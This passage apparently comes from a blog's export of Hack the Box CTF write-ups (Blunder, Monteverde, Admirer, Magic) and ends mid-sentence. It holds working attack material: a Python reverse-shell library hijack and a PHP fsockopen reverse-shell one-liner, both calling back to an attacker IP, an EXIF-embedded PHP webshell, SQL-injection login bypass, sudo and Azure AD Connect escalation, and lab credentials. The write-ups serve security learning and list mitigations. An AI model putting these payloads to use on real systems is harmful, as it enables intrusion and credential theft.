P2000 G3 NAS device (91%), Linux 2.6.26 - 2.6.35 (89%), OpenWrt Kamikaze 7.09 (Linux 2.6.22) (89%), Linux 3.16 - 4.6 (89%), Linux 2.6.32 - 3.13 (88%), Linux 3.3 (88%), Linux 2.6.23 - 2.6.38 (88%), Linux 2.6.31 - 2.6.32 (88%), Linux 2.6.32 (88%), Linux 2.6.32 - 2.6.39 (88%)No exact OS matches for host (test conditions non-ideal).OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Jun 2 16:52:39 2020 -- 1 IP address (1 host up) scanned in 141.22 secondsTwo standard ports are open, 21, indicating FTP, and 80, which indicates a webpage.Additionally, doing a full port scan reveals no new ports. Let’s go ahead and enumerate webpages with gobuster.$ gobuster dir -u http://10.10.10.191 -w /usr/share/wordlists/dirb/common.txt -x .htm,.html,.php,.txtOur scan reveals an admin page at http://10.10.10.191/admin/. This is most likely a CMS for the website, let’s check it out.We find a login page for the Bludit CMS. Unfortunately we don’t have much to go off at the moment and a quick search reveals that there aren’t any unauthenticated vulnerabilities for it.We also find a todo file at http://10.10.10.191/todo.txt, which contains the fergus username, amongst other information. This username, however, fails to authenticate with some common passwords, and too many failed attempts actually locks us out, preventing further attempts.Let’s navigate to the main website and see what useful information we can find.The various webpages don’t reveal any useful information, so let’s just grab as many interesting words and names as we find and create a wordlist called wordlist.txt to attempt a brute force login with.Since the Bludit CMS locks us out when we try a brute force, our earlier research indicates that a proof-of-concept exploit exists to by pass the lockout. Let’s give it a shot.First, we must edit the variables in the POC. Since the todo file mentions a fergus user, we’ll try to brute force that account first.host = &#39;http://10.10.10.191&#39;login_url = host + &#39;/admin/login&#39;username = &#39;fergus&#39;fname = &#39;wordlist.txt&#39;Let’s run the POC and see if any words from the website were also used as a password, for some reason.Quickly, our POC returns valid credentials. RolandDeschain, an interesting typo in the passage above, happens to be the password for the user fergus.Let’s log in and check out the Bludit CMS.Success. Poking around doesn’t reveal anything in and of itself, but our previous research showed that authenticated vulnerabilities exist for older versions of Bludit. Back on our dashboard, the version is displayed. In this particular scenario, the version is 3.9.2, which is vulnerable to a directory traversal attack.We’ll use the exploit provided on Metasploit.$ sudo msfdb runOnce Metasploit is loaded, let’s use the “bludit_upload_images_exec” exploit, set our variables, using our previously discovered valid credentials.msf5 &amp;gt; use exploit/linux/http/bludit_upload_images_execmsf5 &amp;gt; set BLUDITPASS RolandDeschainmsf5 &amp;gt; set BLUDITUSER fergusmsf5 &amp;gt; set TARGETURI /Now, let’s run the exploit.Success, we now have remote access to the box. Let’s spawn a shell with Meterpreter, then upgrade it.meterpeter &amp;gt; shell$ python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);It doesn’t look like we have access to the first flag yet, but looking around, there appears to be a database file within the bludit-3.10.0a directory. Using cat to display the contents of users.php, we reveal the user hugo and a hashed password.$ cd /var/www/bludit-3.10.0a/bl-content/databases$ cat users.php&amp;lt;?php defined(&#39;BLUDIT&#39;) or die(&#39;Bludit CMS.&#39;); ?&amp;gt;{ &quot;admin&quot;: { &quot;nickname&quot;: &quot;Hugo&quot;, &quot;firstName&quot;: &quot;Hugo&quot;, &quot;lastName&quot;: &quot;&quot;, &quot;role&quot;: &quot;User&quot;, &quot;password&quot;: &quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot;, &quot;email&quot;: &quot;&quot;, &quot;registered&quot;: &quot;2019-11-27 07:40:55&quot;, &quot;tokenRemember&quot;: &quot;&quot;, &quot;tokenAuth&quot;: &quot;b380cb62057e9da47afce66b4615107d&quot;, &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;, &quot;twitter&quot;: &quot;&quot;, &quot;facebook&quot;: &quot;&quot;, &quot;instagram&quot;: &quot;&quot;, &quot;codepen&quot;: &quot;&quot;, &quot;linkedin&quot;: &quot;&quot;, &quot;github&quot;: &quot;&quot;, &quot;gitlab&quot;: &quot;&quot;}}Let’s crack this password hash.Back in our shell, we may now be able to change users to hugo, if they’ve reused passwords.$ su hugoPassword: Password120It worked. Now that we’re hugo, let’s grab the user flag.Root FlagAlright, let’s see what privileges hugo has, maybe we can elevate our privileges. We’ll run sudo -l first to see what special commands can be ran.$ sudo -l[...]User hugo may run the following commands on blunder: (ALL, !root) /bin/bashIt looks like our user can run the binary /bin/bash as any user. By running a single command, we can open a shell as root. This exploit is better explained on Exploit DB.$ sudo -u#-1 /bin/bashWe’ve elevated to root! Let’s grab the last flag.Mitigation Avoid having a CMS public-facing, unless absolutely necessary. If so, it should be updated regularly. Like this scenario showed, two vulnerabilities can be strung together to get remote code execution. Additionally, if the CMS is public facing, passwords should not only be complex, but also not in plain text on the website. Careful consideration should be taken when changing the defaults for a user’s privileges. Whether it’s the exploit used in this scenario, or something available on GTFOBins, a lot of routes become available for privilege escalation when privileges are modified or commands are altered to allow execution at a higher integrity. Final ThoughtsThis was an interesting box. The password discovery was a bit weird. It seems that the idea was that the user was typing an entry to his website and typed the name “Roland Deschain” like his password, out of habit. Not really something I understood until I was able to build out a wordlist and brute force the CMS. I liked how SSH was not available, so shell access needed to be achieved through remote code execution vulnerabilities. Additionally, I don’t typically like to use Metasploit in these CTFs but I had a hard time building out an exploit for the directory traversal attack and RCE, so I just spent some extra time learning how the Metasploit module worked." }, { "title": "Hack the Box - Monteverde", "url": "/posts/HTB-Monteverde/", "categories": "Hack the Box, Windows", "tags": "windows, ctf, htb", "date": "2020-05-29 13:00:00 -0500", "snippet": "This is my write-up for the HackTheBox Windows machine Monteverde. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest to the accuracy of my thoughts.Task: Find user.txt and root.txtPenetration MethodologiesScanning nmapEnumeration enum4linux SMB Share enumeration Exploitation Weak password policy Stored plaintext password Priv Esc Azure AD Connect Service Privileged AccountUser FlagOur first step is to run an nmap scan. Monteverde is running a lot of services, which may indicate a Active Directory DC. sC: Enable common scripts sV: version and service on the port O: remote OS detection using fingerprinting # Nmap 7.80 scan initiated Thu May 28 15:05:20 2020 as: nmap -O -sV -sC -oN init172.txt 10.10.10.172Nmap scan report for 10.10.10.172Host is up (0.059s latency).Not shown: 989 filtered portsPORT STATE SERVICE VERSION53/tcp open domain?| fingerprint-strings:| DNSVersionBindReqTCP:| version|_ bind88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-28 19:18:38Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port53-TCP:V=7.80%I=7%D=5/28%Time=5ED01992%P=x86_64-pc-linux-gnu%r(DNSVSF:ersionBindReqTCP,20,&quot;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\SF:x04bind\\0\\0\\x10\\0\\x03&quot;);Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portOS fingerprint not ideal because: Missing a closed TCP port so results incompleteNo OS matches for hostService Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: -46m55s| smb2-security-mode:| 2.02:|_ Message signing enabled and required| smb2-time:| date: 2020-05-28T19:21:03|_ start_date: N/AOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu May 28 15:10:35 2020 -- 1 IP address (1 host up) scanned in 315.60 secondsAfter the results come back, we also run a full port scan to see if any additional ports may be open.$ nmap -O -sV -sC -p- -oN full172.txt 10.10.10.1725985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)The port that we make note of from the full scan is 5985. This tells us that the box is running WinRM 2.0 (Microsoft Windows Remote Management). Once we find some credentials, we may be able to gain a foothold through this service.Next, we’ll run enum4linux, a tool primarily used to enumerate Windows or Samba systems.$ enum4linux -U -o 10.10.10.169One of the most crucial items we receive from enum4linux are users on the system. Two users stand out and are not like the others: AAD__987d7f2f57d2 and SABatchJobs.More enumeration doesn’t yield much information and we don’t have any potential passwords. HackTheBox doesn’t generally encourage bruteforcing credentials, so we’ll try to use the two usernames from earlier as their own passwords.We have two potential services that accept logins, SMB and WinRM. We’ll first try AMB. We can use smbclient to enumerate shares on Monteverde, but only if we have valid credentials. Fortunately, using the command and credentials below, we can sucessfully view the available shares.$ smbclient -L 10.10.10.172 -U SABatchJobs%SABatchJobsThe available shared resources are displayed. Let’s enumerate some of the file system.We’ll connect to the various shares with smbclient.$ smbclient \\\\\\\\10.10.10.172\\\\users$ -U SABatchJobs%SABatchJobWithin the users$ share we find multiple user folders. With some poking around we discover that the user mhope has an interesting xml file. Using the get command, we can retrieve it. Opening it, we find a password stored in cleartext.&amp;lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&amp;gt; &amp;lt;Obj RefId=&quot;0&quot;&amp;gt; &amp;lt;TN RefId=&quot;0&quot;&amp;gt; &amp;lt;T&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/T&amp;gt; &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt; &amp;lt;/TN&amp;gt; &amp;lt;ToString&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/ToString&amp;gt; &amp;lt;Props&amp;gt; &amp;lt;DT N=&quot;StartDate&quot;&amp;gt;2020-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt; &amp;lt;DT N=&quot;EndDate&quot;&amp;gt;2054-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt; &amp;lt;G N=&quot;KeyId&quot;&amp;gt;00000000-0000-0000-0000-000000000000&amp;lt;/G&amp;gt; &amp;lt;S N=&quot;Password&quot;&amp;gt;4n0therD4y@n0th3r$&amp;lt;/S&amp;gt; &amp;lt;/Props&amp;gt; &amp;lt;/Obj&amp;gt;&amp;lt;/Objs&amp;gt;We can only assume that this belongs to the user mhope. With luck, this user also uses the same password across services. Let’s leave the shares behind for now and return to attempt remote access using WinRM.With the help of evil-winrm, a Windows Remote Management tool for pentesting, we gain a foothold on the machine.$ evil-winrm -i 10.10.10.172 -u mhope -p &#39;4n0therD4y@n0th3r$&#39;On the user’s desktop, we’ll find our first flag!Root FlagNow that we have remote access to a user on the system, we need to see what permissions this account has and what groups they are apart of. Let’s use the command net user to start.&amp;gt; net user mhope[...]Global Group memberships *Azure Admins *Domain UsersI omitted some of the results, but it looks like the user mhope is apart of the Azure Admins group. After some research on a potential CVE, we’ll find this article, which provides great information on an exploit that allows a user to retrieve plaintext credentials of the privileged account being utilized by the Azure AD Connect.Let’s download the two files AdDecrypt.exe and mcrypt.dll and uploaded them to Monteverde using the built-in upload feature on evil-winrm.Afterwards, we’ll navigate to the Microsoft Azure AD Sync\\Bin directory, and run the executable.&amp;gt; cd “C:\\Program Files\\Microsoft Azure AD Sync\\Bin”&amp;gt; C:\\Users\\mhope\\AdDecrypt.exe -FullSQLPretty quickly we receive credentials. Fortunately for us, they are for the administrator account!======================AZURE AD SYNC CREDENTIAL DECRYPTION TOOLBased on original code from: https://github.com/fox-it/adconnectdump======================Opening database connection...Executing SQL commands...Closing database connection...Decrypting XML...Parsing XML...Finished!DECRYPTED CREDENTIALS:Username: administratorPassword: d0m@in4dminyeah!Domain: MEGABANK.LOCALWe can once again connect to the machine, this time with our newly attained credentials.$ evil-winrm -i 10.10.10.172 -u administrator -p &#39;d0m@in4dminyeah!&#39;Let’s navigate to the Administrator desktop and collect the flag. Monteverde rooted!Mitigation Don’t use default or weak passwords, specifically, enforce strong policies, even on service accounts (especially on service accounts). Avoid using the same password across multiple services. Patch management; Azure AD Connect should be updated when patches are available and proved stable. Additionally, the accounts used for services should be dedicated service accounts and not an administrator account (principle of least privilege). Final ThoughtsThis was a fun box. At the time of this write-up, SMB is not one of my strengths, and I enjoy learning new ways of interacting with it. I also liked enumerating the machine, I can never get enough Windows enumeration. The password discovery at the beginning also felt realistic, lazy administrators may not consider the consequences of poor password practices on service accounts." }, { "title": "Hack the Box - Admirer", "url": "/posts/HTB-Admirer/", "categories": "Hack the Box, Linux", "tags": "linux, ctf, htb", "date": "2020-05-14 13:00:00 -0500", "snippet": "This is my guide to the HackTheBox Linux machine Admirer. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest to the accuracy of my thoughts.Task: Find user.txt and root.txtPenetration MethodologiesScanning nmapEnumeration Webpage enumeration Misused robots.txt file Exploitation Adminer File Disclosure vulnerabilityPriv Esc Python library hijackingUser FlagTo begin, let’s scan Admirer with nmap. sC: Enable common scripts sV: version and service on the port O: remote OS detection using fingerprinting # Nmap 7.80 scan initiated Sat Sep 26 17:10:10 2020 as: nmap -sC -sV -O -oA scan187 10.10.10.187Nmap scan report for 10.10.10.187Host is up (0.088s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)| ssh-hostkey:| 2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)| 256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)|_ 256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)80/tcp open http Apache httpd 2.4.25 ((Debian))| http-robots.txt: 1 disallowed entry|_/admin-dir|_http-server-header: Apache/2.4.25 (Debian)|_http-title: AdmirerNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP fingerprint:OS:SCAN(V=7.80%E=4%D=9/26%OT=21%CT=1%CU=36389%PV=Y%DS=2%DC=I%G=Y%TM=5F6FBC5OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=8)OPSOS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECNOS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(ROS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%FOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CDOS:=S)Network Distance: 2 hopsService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Sep 26 17:10:36 2020 -- 1 IP address (1 host up) scanned in 26.92 secondsOur scan indicates that FTP is available, along with SSH and a webpage. While enumerating these open ports, we can run a full port scan, which doesn’t yield anything of interest.Anonymous logins are not allowed on FTP on this machine, so let’s just into some webpage enumeration. Our scan indicates a robots.txt webpage, which we can also check out.Navigating to the webpage yields little. It looks like a repository for photos, but no links or additional pages can be found from the home page.Our next step could using a directory enumeration tool like gobuster to find more pages, but first, our nmap scan indicated a robots.txt page. This page usually contains instructions for the many of the good bots that crawl the internet, informing them of the “rules” of the site. This may contain some info on directories or pages that the developer doesn’t want the bots to index.User-agent: *# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldoDisallow: /admin-dirAwesome, so waldo, presumably our web admin, doesn’t want the web crawlers to visit the /admir-dir directory, as it contains “contacts” and “creds”. Fortunately for us, this doesn’t actually prevent anyone from visiting the directory or its files.Before we start to enumerate this directory, let’s just see if there is a “contacts” and “credentials” pages within the /admin-dir. After a few extension attempts, it looks like the /admin-dir/contacts.txt exists, and contains some useful information.########### admins ############ PennyEmail: p.wise@admirer.htb############### developers ################ RajeshEmail: r.nayyar@admirer.htb# AmyEmail: a.bialik@admirer.htb# LeonardEmail: l.galecki@admirer.htb############## designers ############### HowardEmail: h.helberg@admirer.htb# BernadetteEmail: b.rauch@admirer.htbWe’ve got some names and emails, let’s grab them, just in case we’ll need them later.Next, let’s see if the “creds” are available in the same way. We’ll see if there is a file at the location /admin-dir/credentials.txt.[Bank Account]waldo.11Ezy]m27}OREc$[Internal mail account]w.cooper@admirer.htbfgJr6q#S\\W:$P[FTP account]ftpuser%n?4Wz}R$tTF7[Wordpress account]adminw0rdpr3ss01!This one yields even more valuable information, containing usernames and passwords. The most relevant one for us right now is the FTP login credentials, but we’ll grab everything and store them in username and password files, in case we need to bruteforce some logins.Let’s go ahead and try our new FTP credentials.$ ftp 10.10.10.187Connected to 10.10.10.187.220 (vsFTPd 3.0.3)Name (10.10.10.187:seeker): ftpuserSuccess. Here we find a compressed directory, html.tar.gz, which looks like it may contain a backup of the web server, or maybe partially. Let’s use the get command to grab it with FTP, then open it up on our machine.Okay, we see the robots.txt that we discovered earlier, and a w4ld0s_s3cr3t_d1r directory which, upon opening, reveals the two webpages we discovered earlier, indicating this is the /admin_dir. Opening the index.php file reveals some credentials for the database, which we will save for later.$servername = &quot;localhost&quot;;$username = &quot;waldo&quot;;$password = &quot;]F7jLHw:*G&amp;gt;UPrTo}~A&quot;d6b&quot;;$dbname = &quot;admirerdb&quot;;What really stands out for us, though, is the /utility-scripts directory. Within it, are a few PHP files. It looks like we can navigate to them in our web browser. Let’s check out the /utility-scripts/info.php page, which looks like it may display more information about the web server.Upon closer inspection, it looks like there’s some information about a program called Adminer, with a version of 4.7.7.A quick Google search reveals that Adminer is a Database manager in a single PHP file, and can be accessed at adminer.php. Navigating to http://10.10.10.187/adminer.php doesn’t work so let’s try it under one of the directories that we know.The login page successfully loads at 10.10.10.187/utility-scripts/adminer.php. We can attempt login with our previously discovered credentials, with no luck. Fortunately, we can now see that the actual version of the program is 4.6.2.A search reveals that this version of Adminer is vulnerable to an attack that can be used to reveal the credentials for the database, if they happen to stored in the configuration files. We remember earlier that database credentials were, in fact, stored, but it appears that they may not be up-to-date. Using this method, we may be able to dump what is currently stored.In short, the attack requires us to create our own database, then connect to it with the victim’s Adminer instance. There, we can load local files into our database, where we may be able to see sensitive information, like credentials.Let’s go ahead and host our database and access it. It should be noted that this database is accessible by everyone on HackTheBox, so take care with best security practices, and make sure to stop the process when we’re done.We’ll run our commands in the MariaDB monitor, creating our user, our database, and adding a password to the user.&amp;gt; create user testuser@&#39;%&#39; identified by &#39;testuser&#39;;&amp;gt; create database testdb;&amp;gt; grant all privileges on testdb.* to &#39;testuser&#39;;&amp;gt; set password for testuser@&#39;%&#39; = password(&#39;testpass&#39;);Next, we’ll jump back to the login page and input our information into the required fields. This should connect back to our database hosted on our machine.Success. We’re now logged onto our database with the Adminer database manager on the Admirer machine.In order for the attack to work, we need to create a table. This is were the data that we pull from local files will be stored to be accessed after the attack.Now, to run the exploit. We will run the following SQL command to try to grab the index.php file. Ideally, this will have current database creds that’ll help us get a foothold.load data local infile &#39;../index.php&#39;into table testdb.t1fields terminated by &#39;\\n&#39;Query executed, with what appears to be no errors. Let’s jump to our table we created earlier and see if it’s populated with anything useful. Part of the way down, we can see the database credentials like before, but this time the password is different.Great, let’s go back to our MariaDB session and quickly clean up. We’ll delete the user, drop the database and stop the MySQL process.&amp;gt; drop user &#39;testuser&#39;@&#39;%&#39;;&amp;gt; drop database testdb;&amp;gt; exit$ sudo service mysql stopWith our lists of usernames and passwords, we use hydra to quickly enumerate which combinations will work.Found usernames:waldobernadettehowardleonardamyrajeshpennyAnd passwords:Wh3r3_1s_w4ld0?]F7jLHw:*G&amp;gt;UPrTo}~A&quot;d6bEzy]m27}OREc$&amp;amp;&amp;lt;h5b~yK3F#{PaPB&amp;amp;dA}{H&amp;gt;Since SSH appears to be the only service available that we can use these credentials with, we’ll try that first.$ hydra -L users.txt -P passwords.txt ssh://10.10.10.187Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-26 21:06:26[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 16 tasks per 1 server, overall 16 tasks, 32 login tries (l:8/p:4), ~2 tries per task[DATA] attacking ssh://10.10.10.187:22/[22][ssh] host: 10.10.10.187 login: waldo password: &amp;amp;&amp;lt;h5b~yK3F#{PaPB&amp;amp;dA}{H&amp;gt;1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-26 21:06:33Looks like there is a username and password combination that works on SSH. Specifically, our newly uncovered database password was reused by user waldo for their SSH login.Let’s grab the user flag.Root FlagOn to root. First thing we’ll do is check the privileges of user waldo.$ sudo -l[sudo] password for waldo:Matching Defaults entries for waldo on admirer: env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, listpw=alwaysUser waldo may run the following commands on admirer: (ALL) SETENV: /opt/scripts/admin_tasks.shOkay, it looks like waldo can execute a bash script as root. Taking a look at the script, option number 6 calls the backup.py python script to perform a backup of the web data. Knowing that this bash script can be run as root by waldo, we can infer that this python script is also called as root as well. Let’s give this python script a look.$ cat /opt/scripts/backup.py#!/usr/bin/python3from shutil import make_archivesrc = &#39;/var/www/html/&#39;# old ftp directory, not used anymore#dst = &#39;/srv/ftp/html&#39;dst = &#39;/var/backups/html&#39;make_archive(dst, &#39;gztar&#39;, src)The script imports the make_archive() function from the shutil library and runs the method. Because the script is executed as the root user, this function is also ran as root. If we can make this backup.py script import a function that we’ve created, we can potential execute our code as root.Well, that’s just what we are going to do with a technique called Python library hijacking. Here is a great article on it. Essentially, we are going to alter the path that is used upon execution and point it the directory where we have our own malicious library.Let’s create our own stutil.py in the /tmp directory.import osimport ptyimport socketlhost = &quot;10.10.15.83&quot;lport = 4444def make_archive(a, b, c): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) os.putenv(&quot;HISTFILE&quot;,&#39;/dev/null&#39;) pty.spawn(&quot;/bin/bash&quot;) s.close()This library only contains the make_archive function and when the function is called, it’ll open a reverse shell to our machine. Let’s save this, and go back to our box and start an netcat listener.$ nc -lvnp 4444Now, let’s run the admin_tasks.sh script using sudo, but this time, we will define our own path using the PYTHONPATH variable.$ sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh[[[ System Administration Menu ]]]1) View system uptime2) View logged in users3) View crontab4) Backup passwd file5) Backup shadow file6) Backup web data7) Backup DB8) QuitChoose an option: 6Running backup script in the background, it might take a while...Choosing option 6 will run the python script, importing our malicious library, and executing our function. Our reverse shell connects, and we have successfully executed our privileges. Let’s grab the root flag.Mitigation A web administrator should know that the robots.txt file only works to prevent benevolent bots, like web crawlers, and doesn’t prevent humans or bad bots from seeing directories. Actually, this file is a great way to enumerate hidden directories. This paired with plaintext credentials that are available publicly are a recipe for disaster. Avoid keeping management software public facing. If it needs to be publicly available, an administrator should strive to keep it up to date, as a vulnerability poses significant risk. Special caution should be taken when a user can run certain commands with escalated privileges. This risk is especially amplified when a user can run a command that executes a python script in this manner. Preventing the paths that Python uses to search for libraries from being writable may help mitigate the risks associated with this. Final ThoughtsI learned a lot from this box! It was different and although I spent a ton of time at the beginning enumerating directories, it helped me analyze hints and clues better and realize that bruteforcing directories may not be the best method going forward. It got me to delve into a couple topics more heavily as well, like the purpose of robots.txt and Python path hijacking. Overall, a good box." }, { "title": "Hack the Box - Magic", "url": "/posts/HTB-Magic/", "categories": "Hack the Box, Linux", "tags": "linux, ctf, htb", "date": "2020-05-02 13:00:00 -0500", "snippet": "This is my guide to the HackTheBox Linux machine Magic. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest to the accuracy of my thoughts.Task: Find user.txt and root.txtPenetration MethodologiesScanning nmapEnumeration Webpage enumeration Database dumping Exploitation SQL injection Improper image validation Priv Esc SUID Binaries Path variable abuse User FlagOur first step is to scan Magic with nmap. sC: Enable common scripts sV: version and service on the port O: remote OS detection using fingerprinting # Nmap 7.80 scan initiated Mon Jun 1 15:06:51 2020 as: nmap -sC -sV -O -oA scan185 10.10.10.185Nmap scan report for 10.10.10.185Host is up (0.097s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)| 256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)|_ 256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Magic PortfolioNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP fingerprint:OS:SCAN(V=7.80%E=4%D=6/1%OT=22%CT=1%CU=37392%PV=Y%DS=2%DC=I%G=Y%TM=5ED5600EOS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=ASOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%TOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=OS:S)Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Mon Jun 1 15:07:42 2020 -- 1 IP address (1 host up) scanned in 51.19 secondsOnce the results return, we’ll also run a full port scan, which yields nothing of use. Two standard ports are open, 22 and 80, which indicates a webserver.Let’s head over to the webpage.The page looks like a simple image repository with a few dead links, and a log in. Let’s check out the log in page.After trying a few default usernames and passwords, they don’t seem to work. Let’s attempt a SQL injection to see if this site is vulnerable. There a few tools that can help automate this process but we’ll quickly test a few options manually. This article has some great information on bypassing logins with SQL injection vulnerabilities.After a few tries, the following gets us logged in.username: &#39; or 1=1 --password: &#39; or 1=1 --It looks like we now have access to an image upload page.Uploading an image reveals that it can be accessed remotely via the URL path http://10.10.10.185/images/uploads/image.jpg. This indicates to us that if we can upload code, we can potentially open a reverse shell to the box.Although unlikely, let’s try uploading a reverse shell script with the JPEG extension appended to the end.No luck. There is some level of image validation occurring here, so let’s try a different route. Chances are, the validator is looking at the MIME type and the extension.Using the exiftool, let’s add some simple PHP code to the comment metadata of an image that will allow RCE on the box, if it bypasses the validator.Additionally, in order for our browser to execute the code injected in the image, we need to add the PHP extension to the image name, but we must still keep the JPEG extension at the end, as this will allow the image through.$ sudo exiftool -Comment=&#39;&amp;lt;?php if(isset($_REQUEST[&#39;cmd&#39;])){ echo &quot;&amp;lt;pre&amp;gt;&quot;; $cmd = ($_REQUEST[&#39;cmd&#39;]); system($cmd); echo &quot;&amp;lt;/pre&amp;gt;&quot;; die; }?&amp;gt;&#39; sponge.jpg$ mv sponge.jpg sponge.php.jpgLet’s try to get this uploaded.Success! Using the following URL, we should be able to execute commands remotely: http://10.10.10.185/images/uploads/photo.php.png?cmd=COMMANDIt looks like we are able to do so.This is a bit clunky and the images are wiped after a certain period of time. Let’s see if we can use this command execution to get a reverse shell.Firstly, we’ll start our netcat listener.$ nc -lvnp 4444If all goes well, the following PHP command plugged into the URL will open a reverse shell on the box and connect back to our machine.php -r &#39;$sock=fsockopen(&quot;10.10.15.2&quot;,4444);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);&#39;Plugging it in as is, though, could cause some unwanted issues as the browser tries to interpret certain characters and breakpoints. Let’s use an online URL encoder to help mitigate this. This simply replaces the characters with something more concise for the browser to interpret.With our listener ready and our image payload uploaded, navigating to this link should open a reverse shell that connects to our attacking 